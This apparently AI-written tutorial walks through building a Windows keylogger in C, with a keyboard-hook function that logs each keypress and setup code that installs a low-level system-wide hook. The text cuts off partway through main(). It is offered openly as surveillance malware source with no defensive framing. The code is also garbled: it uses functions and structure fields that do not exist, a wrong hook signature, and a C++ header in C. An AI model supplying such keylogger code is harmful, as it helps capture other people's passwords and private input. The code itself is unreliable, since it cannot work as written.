To create a keystroke-logging application in C for Windows, follow these steps:

### Step-by-Step Explanation and Code

1. **Include Necessary Headers**: 
   - Include the Windows header files needed for keyboard hooking.
   ```c
   #include <windows.h>
   #include <stdio.h>
   #include <iostream>
   #include <time.h>
   ```

2. **Define the Keyboard Hook Function**:
   - Declare a function that will handle keyboard events.
   ```c
   LRESULT CALLBACK keyboardHook(int hwnd, int wParam, int lParam) {
       // Use a static variable to store the last pressed key
       static int lastKey = 0;

       // Check if the event is a key press
       if (wParam == 0x0001) {
           // Retrieve the key value
           int key = (int)lParam;
           // Print or log the key press
           printf("Key pressed: %d (0x%x)\n", key, key);
           lastKey = key;
       }

       // Continue processing the event
       return CallNextEvent(wparam, lParam);
   }
   ```

3. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHook` to attach the hook function to the system.
   ```c
   int main() {
       // Define the window class
       WNDCLASS wc = {0};
       wc.cbSize = sizeof(WNDCLASS);
       wc.hInstance = GetWindowModuleHandle();
       wc.lpfnMouseProc = NULL;
       wc.lpfnKeyboardProc = keyboardHook;
       RegisterClass(&wc);

       // Create a window to receive events
       HWND hwnd = CreateWindow("MyWindow", "Keystroke Logger", WS_OVERLAPPED | WS_HIGHLIGHTED | WS_MAXIMIZE, 0, 0, 0, 0, 0, NULL, NULL);

       // Set up the hook
       int hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);

       // Check if hooking was successful
       if (hook == 0) {
           printf("Failed to set keyboard hook!\n");
